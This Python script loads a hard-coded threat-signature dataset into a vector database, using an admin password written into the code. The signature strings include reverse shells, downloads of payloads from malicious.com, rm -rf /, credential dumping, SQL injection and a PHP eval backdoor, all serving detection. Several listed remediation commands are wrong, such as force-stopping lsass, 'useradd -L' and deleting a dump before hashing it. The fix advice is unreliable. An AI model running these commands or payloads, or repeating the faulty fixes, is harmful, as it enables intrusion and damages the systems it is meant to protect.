from cosdata import Client
from sentence_transformers import SentenceTransformer
import uuid
import time
import json # Added to handle list conversion

# ==============================================================================
# CYBER_GUARDIAN v5.0 - ENTERPRISE THREAT INTELLIGENCE INGESTION ENGINE
# ==============================================================================

# --- CONFIGURATION ---
ADMIN_KEY = "admin123"
HOST_URL = "http://localhost:8443"
COLLECTION_NAME = "cyber_threats_v2"

print(f"\n[SYSTEM] 🔌 Connecting to Cosdata Vector DB at {HOST_URL}...")
try:
    client = Client(host=HOST_URL, username="admin", password=ADMIN_KEY, verify=False)
    model = SentenceTransformer('all-MiniLM-L6-v2')
    print("[SYSTEM] ✅ Connection Established & Neural Engine Loaded.")
except Exception as e:
    print(f"[SYSTEM] ❌ CRITICAL ERROR: Could not connect to DB. {e}")
    exit(1)

# 1. ROBUST COLLECTION SETUP
print("[SYSTEM] 📚 Configuring Knowledge Base...")
try:
    # Attempt to create fresh
    collection = client.create_collection(
        name=COLLECTION_NAME, 
        dimension=384,
        description="Enterprise Threat Intelligence V5"
    )
    print("[SYSTEM] ✅ Created new collection.")
    print("[SYSTEM] 🏗️  Building HNSW Semantic Index...")
    collection.create_index(distance_metric="cosine")
except Exception as e:
    # If exists, load it
    print(f"[SYSTEM] ℹ️  Collection exists. Loading existing data matrix...")
    collection = client.get_collection(COLLECTION_NAME)

# ==============================================================================
# 2. THREAT INTELLIGENCE DATASET (The "Brain")
# ==============================================================================
print("[SYSTEM] 🚀 Preparing Massive Threat Dataset...")

data = [
    # ==========================================================================
    # SECTION 1: WINDOWS ENDPOINT THREATS
    # ==========================================================================
    
    # --- Ransomware Indicators ---
    {
        "text": "[CRITICAL] EventID 4688: New Process Name: C:\\Users\\Public\\encryptor.exe. File modification .locked extension detected.",
        "category": "Ransomware",
        "technique": "T1486 - Data Encrypted for Impact",
        "severity": "Critical",
        "fix": "1. ISOLATE HOST IMMEDIATELY. 2. Kill process 'encryptor.exe'. 3. Check for persistence.",
        "commands": ["Stop-Computer -Force", "taskkill /F /IM encryptor.exe", "netsh advfirewall set allprofiles state on"]
    },
    {
        "text": "vssadmin.exe Delete Shadows /All /Quiet volume shadow copy removal ransomware precursor",
        "category": "Defense Evasion",
        "technique": "T1490 - Inhibit System Recovery",
        "severity": "Critical",
        "fix": "RANSOMWARE IMMINENT. Stop all suspicious processes. Disconnect network.",
        "commands": ["vssadmin list shadows", "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10"]
    },
    {
        "text": "wbadmin delete catalog -quiet backup deletion ransomware tactic",
        "category": "Defense Evasion",
        "technique": "T1490 - Inhibit System Recovery",
        "severity": "Critical",
        "fix": "Alert SOC. Verify backup integrity immediately.",
        "commands": ["wbadmin get versions", "Get-EventLog -LogName Security -Newest 100"]
    },
    {
        "text": "bcdedit /set {default} recoveryenabled No /set {default} bootstatuspolicy ignoreallfailures",
        "category": "Impact",
        "technique": "T1490 - Inhibit System Recovery",
        "severity": "Critical",
        "fix": "Re-enable recovery options. Scan for ransomware payload.",
        "commands": ["bcdedit /enum", "sfc /scannow"]
    },

    # --- Credential Theft (LSASS/Mimikatz) ---
    {
        "text": "Suspicious access to lsass.exe system memory by unknown process mimikatz.exe",
        "category": "Credential Access",
        "technique": "T1003.001 - OS Credential Dumping: LSASS Memory",
        "severity": "Critical",
        "fix": "ISOLATE WORKSTATION. Reset Admin passwords (KRBTGT). Enable Credential Guard.",
        "commands": ["Stop-Process -Name lsass -Force", "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f"]
    },
    {
        "text": "sekurlsa::logonpasswords detected in command line or memory dump",
        "category": "Credential Access",
        "technique": "T1003 - Credential Dumping",
        "severity": "Critical",
        "fix": "Active Mimikatz execution detected. Kill process.",
        "commands": ["Invoke-IRCleanup", "Get-Process | Where-Object {$_.Path -like '*mimikatz*'} | Stop-Process"]
    },
    {
        "text": "procdump.exe -ma lsass.exe lsass.dmp dumping process memory",
        "category": "Credential Access",
        "technique": "T1003.001 - OS Credential Dumping",
        "severity": "High",
        "fix": "Block Procdump usage. Investigate dump file destination.",
        "commands": ["del lsass.dmp", "Get-FileHash lsass.dmp"]
    },
    {
        "text": "EventID 4624: Logon Type 10 (RemoteInteractive) Administrator source IP external RDP brute force",
        "category": "Credential Access",
        "technique": "T1110 - Brute Force",
        "severity": "Medium",
        "fix": "Check Source IP reputation. Enforce MFA for RDP. Block IP.",
        "commands": ["netsh advfirewall firewall add rule name='BlockBadIP' dir=in action=block remoteip=<IP>"]
    },

    # --- Persistence ---
    {
        "text": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\temp\\evil.exe",
        "category": "Persistence",
        "technique": "T1547.001 - Registry Run Keys",
        "severity": "High",
        "fix": "Delete registry key. Quarantine executable.",
        "commands": ["reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /f"]
    },
    {
        "text": "schtasks /create /tn SecurityUpdate /tr C:\\Users\\Public\\nc.exe /sc onlogon",
        "category": "Persistence",
        "technique": "T1053.005 - Scheduled Task",
        "severity": "High",
        "fix": "Delete malicious task. Check file path.",
        "commands": ["schtasks /delete /tn SecurityUpdate /f"]
    },
    {
        "text": "EventID 4720: A user account was created. Target Account Name: support_backdoor. Performed by: SYSTEM.",
        "category": "Persistence",
        "technique": "T1136 - Create Account",
        "severity": "Critical",
        "fix": "Audit unauthorized account creation. Delete account immediately.",
        "commands": ["net user support_backdoor /delete", "Get-EventLog -LogName Security -InstanceId 4720"]
    },

    # --- Evasion & Execution ---
    {
        "text": "Set-MpPreference -DisableRealtimeMonitoring $true powershell disable antivirus",
        "category": "Defense Evasion",
        "technique": "T1562.001 - Impair Defenses",
        "severity": "Critical",
        "fix": "Re-enable Defender immediately. Isolate host.",
        "commands": ["Set-MpPreference -DisableRealtimeMonitoring $false", "Start-MpScan -ScanType QuickScan"]
    },
    {
        "text": "powershell.exe -nop -w hidden -enc JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
        "category": "Execution",
        "technique": "T1059.001 - PowerShell (Encoded Command)",
        "severity": "Critical",
        "fix": "Terminate PowerShell. Inspect decoded script.",
        "commands": ["Stop-Process -Name powershell -Force", "Get-History"]
    },
    {
        "text": "bitsadmin /transfer myDownloadJob /download /priority normal http://malicious.com/rat.exe C:\\rat.exe",
        "category": "Defense Evasion",
        "technique": "T1197 - BITS Jobs",
        "severity": "High",
        "fix": "Cancel BITS job. Delete file.",
        "commands": ["bitsadmin /reset /allusers"]
    },
    {
        "text": "certutil -urlcache -split -f http://malicious.com/loader.exe C:\\loader.exe",
        "category": "Defense Evasion",
        "technique": "T1105 - Ingress Tool Transfer",
        "severity": "High",
        "fix": "Detect misuse of certutil for downloading. Delete file.",
        "commands": ["del C:\\loader.exe"]
    },
    {
        "text": "EventID 1102: The audit log was cleared. Account Name: Administrator.",
        "category": "Defense Evasion",
        "technique": "T1070 - Indicator Removal",
        "severity": "High",
        "fix": "Investigate user activity. Check centralized logging server.",
        "commands": ["Get-WinEvent -LogName Security -MaxEvents 10"]
    },

    # ==========================================================================
    # SECTION 2: LINUX & SERVER THREATS
    # ==========================================================================
    
    # --- Destruction & Wipers ---
    {
        "text": "rm -rf / --no-preserve-root root directory deletion destructive command",
        "category": "System Destruction",
        "technique": "T1485 - Data Destruction",
        "severity": "Critical",
        "fix": "BLOCK USER. Terminate SSH Session. Restore from Backup.",
        "commands": ["pkill -u <user>", "useradd -L <user>"]
    },
    {
        "text": "wipefiles.exe deleting /etc/*.conf files data destruction wiper malware",
        "category": "Malware / Wiper",
        "technique": "T1485 - Data Destruction",
        "severity": "Critical",
        "fix": "ISOLATE HOST. Kill process.",
        "commands": ["killall -9 wipefiles"]
    },
    {
        "text": "shred -u /var/log/auth.log secure log deletion",
        "category": "Defense Evasion",
        "technique": "T1070 - Indicator Removal",
        "severity": "High",
        "fix": "Check remote syslog. Lock user.",
        "commands": ["last", "history"]
    },

    # --- Reverse Shells & Backdoors ---
    {
        "text": "nc -e /bin/bash 192.168.1.55 4444 netcat reverse shell",
        "category": "Command & Control",
        "technique": "T1059 - Command and Scripting Interpreter",
        "severity": "Critical",
        "fix": "Kill Netcat. Check Cron/Startup for persistence.",
        "commands": ["killall -9 nc", "grep 'nc' /etc/crontab"]
    },
    {
        "text": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 bash reverse shell",
        "category": "Command & Control",
        "technique": "T1059.004 - Unix Shell",
        "severity": "Critical",
        "fix": "Kill Bash process. Block outbound IP.",
        "commands": ["ps aux | grep bash", "iptables -A OUTPUT -d 10.0.0.1 -j DROP"]
    },
    {
        "text": "python -c 'import socket,subprocess,os;s=socket.socket...'",
        "category": "Command & Control",
        "technique": "T1059.006 - Python",
        "severity": "Critical",
        "fix": "Terminate Python process.",
        "commands": ["pkill -f python"]
    },

    # --- Privilege Escalation ---
    {
        "text": "sudo: employee123 : user NOT in sudoers ; COMMAND=/bin/cat /etc/shadow",
        "category": "Privilege Escalation",
        "technique": "T1078 - Valid Accounts",
        "severity": "Medium",
        "fix": "Audit sudo attempts. Warn User.",
        "commands": ["cat /var/log/auth.log | grep sudo", "visudo"]
    },
    {
        "text": "User 'apache' executed 'sudo /bin/bash' without password. Root access granted.",
        "category": "Privilege Escalation",
        "technique": "T1548 - Abuse Elevation Control Mechanism",
        "severity": "Critical",
        "fix": "Revoke Sudo Rights. Lock User Account.",
        "commands": ["usermod -L apache", "vi /etc/sudoers"]
    },
    {
        "text": "chmod u+s /bin/bash SUID bit set on shell",
        "category": "Persistence",
        "technique": "T1548.001 - Setuid and Setgid",
        "severity": "High",
        "fix": "Remove SUID bit. Audit file permissions.",
        "commands": ["chmod u-s /bin/bash", "find / -perm -4000"]
    },

    # --- Crypto Mining ---
    {
        "text": "xmrig.exe high CPU usage mining pool port 3333 resource hijacking",
        "category": "Resource Hijacking",
        "technique": "T1496 - Resource Hijacking",
        "severity": "High",
        "fix": "Kill Miner. Block Pool IP.",
        "commands": ["kill -9 $(pidof xmrig)", "iptables -A OUTPUT -p tcp --dport 3333 -j DROP"]
    },
    {
        "text": "minerd -o stratum+tcp://pool.minexmr.com:4444 -u wallet_address",
        "category": "Resource Hijacking",
        "technique": "T1496 - Resource Hijacking",
        "severity": "High",
        "fix": "Kill Miner. Scan for startup script.",
        "commands": ["pkill -f minerd", "ls /etc/init.d"]
    },

    # ==========================================================================
    # SECTION 3: WEB APPLICATION ATTACKS
    # ==========================================================================
    
    # --- SQL Injection ---
    {
        "text": "POST /login.php?username=admin' OR '1'='1' -- HTTP/1.1 200",
        "category": "Web Attack",
        "technique": "T1190 - Exploit Public-Facing Application",
        "severity": "Critical",
        "fix": "Block IP. Enable WAF. Sanitize Input.",
        "commands": ["fail2ban-client set nginx-botsearch banip <IP>"]
    },
    {
        "text": "GET /products.php?id=1 UNION SELECT username, password FROM users --",
        "category": "Web Attack",
        "technique": "T1190 - SQL Injection",
        "severity": "Critical",
        "fix": "Enable Prepared Statements. Block IP.",
        "commands": ["grep 'UNION' /var/log/nginx/access.log"]
    },
    {
        "text": "SELECT * FROM users WHERE id = 1; DROP TABLE users --",
        "category": "Web Attack",
        "technique": "T1190 - SQL Injection",
        "severity": "Critical",
        "fix": "Database destruction attempt. Block IP.",
        "commands": ["tail -f /var/log/mysql/error.log"]
    },

    # --- Web Shells ---
    {
        "text": "POST /uploads/image.php.jpg content-type: application/x-php",
        "category": "Persistence",
        "technique": "T1505.003 - Web Shell",
        "severity": "Critical",
        "fix": "Block Upload. Delete File.",
        "commands": ["rm /var/www/uploads/image.php.jpg", "find /var/www -name '*.php'"]
    },
    {
        "text": "eval(base64_decode($_POST['cmd'])) php backdoor execution",
        "category": "Execution",
        "technique": "T1059.003 - PHP Command Execution",
        "severity": "Critical",
        "fix": "Quarantine Server. Scan for backdoors.",
        "commands": ["grep -r 'eval(' /var/www"]
    },

    # --- LFI / RFI / XSS ---
    {
        "text": "GET /index.php?page=../../../../etc/passwd HTTP/1.1",
        "category": "Web Attack",
        "technique": "T1083 - File and Directory Discovery (LFI)",
        "severity": "High",
        "fix": "Disable file system access. Configure chroot.",
        "commands": ["grep '../' /var/log/apache2/access.log"]
    },
    {
        "text": "GET /search.php?q=<script>alert('hacked')</script> HTTP/1.1 200",
        "category": "Web Attack",
        "technique": "T1059.007 - Cross-Site Scripting (XSS)",
        "severity": "Medium",
        "fix": "Sanitize HTML Output. Enable CSP.",
        "commands": ["Review Web Logs"]
    },
    {
        "text": "GET /admin/config.php.bak backup file disclosure",
        "category": "Information Disclosure",
        "technique": "T1003 - Credential Dumping",
        "severity": "Medium",
        "fix": "Remove backup files from public webroot.",
        "commands": ["rm /var/www/html/*.bak"]
    },

    # ==========================================================================
    # SECTION 4: AWS & CLOUD SECURITY
    # ==========================================================================
    
    # --- S3 Exfiltration ---
    {
        "text": "eventName: GetObject eventSource: s3.amazonaws.com key: company_salaries.csv userIdentity: unknown",
        "category": "Exfiltration",
        "technique": "T1530 - Data from Cloud Storage",
        "severity": "Critical",
        "fix": "Revoke S3 Public Access. Rotate Keys.",
        "commands": ["aws s3api put-public-access-block --bucket <name>"]
    },
    {
        "text": "eventName: PutBucketAcl bucketName: customer-data acl: public-read",
        "category": "Defense Evasion",
        "technique": "T1562 - Impair Defenses",
        "severity": "High",
        "fix": "Make Bucket Private Immediately.",
        "commands": ["aws s3api put-bucket-acl --bucket customer-data --acl private"]
    },

    # --- EC2 & Computing ---
    {
        "text": "instanceType: p3.16xlarge eventName: RunInstances region: us-east-1 unusual compute spike",
        "category": "Resource Hijacking",
        "technique": "T1496 - Resource Hijacking (Mining)",
        "severity": "Critical",
        "fix": "Check for Crypto Mining. Stop Instance.",
        "commands": ["aws ec2 stop-instances --instance-ids <ID>"]
    },
    {
        "text": "eventName: TerminateInstances userName: disgruntled_employee",
        "category": "Impact",
        "technique": "T1485 - Data Destruction",
        "severity": "High",
        "fix": "Enable Termination Protection. Lock user.",
        "commands": ["aws ec2 modify-instance-attribute --instance-id <ID> --disable-api-termination"]
    },
    {
        "text": "VPC-FLOW: REJECT 4444 c2 traffic command and control outbound connection",
        "category": "Command & Control",
        "technique": "T1071 - Application Layer Protocol",
        "severity": "High",
        "fix": "Block C2 IP. Isolate Instance.",
        "commands": ["aws ec2 create-network-acl-entry --ingress --rule-action deny"]
    },

    # --- IAM & Access ---
    {
        "text": "eventName: CreateAccessKey userName: intern_user errorCode: AccessDenied",
        "category": "Privilege Escalation",
        "technique": "T1078 - Valid Accounts",
        "severity": "Medium",
        "fix": "Investigate User Intent. Rotate Keys.",
        "commands": ["aws iam list-access-keys"]
    },
    {
        "text": "eventName: ConsoleLogin userIdentity: Root Account Used",
        "category": "Privilege Escalation",
        "technique": "T1078 - Valid Accounts",
        "severity": "Medium",
        "fix": "Avoid using Root Account. Enable MFA.",
        "commands": ["Check CloudTrail for Root activity"]
    },
    {
        "text": "eventName: StopLogging eventSource: cloudtrail.amazonaws.com",
        "category": "Defense Evasion",
        "technique": "T1562.001 - Impair Defenses",
        "severity": "Critical",
        "fix": "Re-enable CloudTrail. Alert SOC.",
        "commands": ["aws cloudtrail start-logging --name <trail_name>"]
    },
    {
        "text": "AuthorizeSecurityGroupIngress cidrIp 0.0.0.0/0 fromPort 22 toPort 22 open ssh",
        "category": "Cloud Misconfiguration",
        "technique": "T1562 - Impair Defenses",
        "severity": "High",
        "fix": "Restrict SSH to VPN IP only.",
        "commands": ["aws ec2 revoke-security-group-ingress --group-id <ID> --protocol tcp --port 22 --cidr 0.0.0.0/0"]
    },
    {
        "text": "GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ ssrf metadata attack",
        "category": "Credential Access",
        "technique": "T1552 - Unsecured Credentials",
        "severity": "Critical",
        "fix": "Block IMDSv1. Enforce IMDSv2.",
        "commands": ["aws ec2 modify-instance-metadata-options --http-tokens required"]
    }
]

# ==============================================================================
# 3. UPLOAD EXECUTION
# ==============================================================================
print(f"[SYSTEM] 🚀 Ingesting {len(data)} Advanced Threat Signatures...")
success_count = 0

with collection.transaction() as txn:
    for item in data:
        try:
            vector = model.encode(item["text"]).tolist()
            
            # FIX: Convert list of commands to a single string for Metadata storage
            commands_str = " || ".join(item.get("commands", []))
            
            # Save clean record
            record = {
                "id": str(uuid.uuid4()),
                "dense_values": vector,
                "text": item["text"], 
                "metadata": {
                    "category": item["category"],
                    "technique": item["technique"],
                    "severity": item["severity"],
                    "fix": item["fix"],
                    "commands_str": commands_str # Storing as string to avoid sequence error
                }
            }
            txn.upsert_vector(record)
            print(f"   -> Learned: {item['technique'][:40]}...")
            success_count += 1
        except Exception as e:
            print(f"   [ERROR] Failed to ingest item: {e}")

print(f"\n[SYSTEM] 🎉 Knowledge Base Updated Successfully! ({success_count}/{len(data)} records)")
print("[SYSTEM] ✅ Ready for Enterprise Threat Detection.")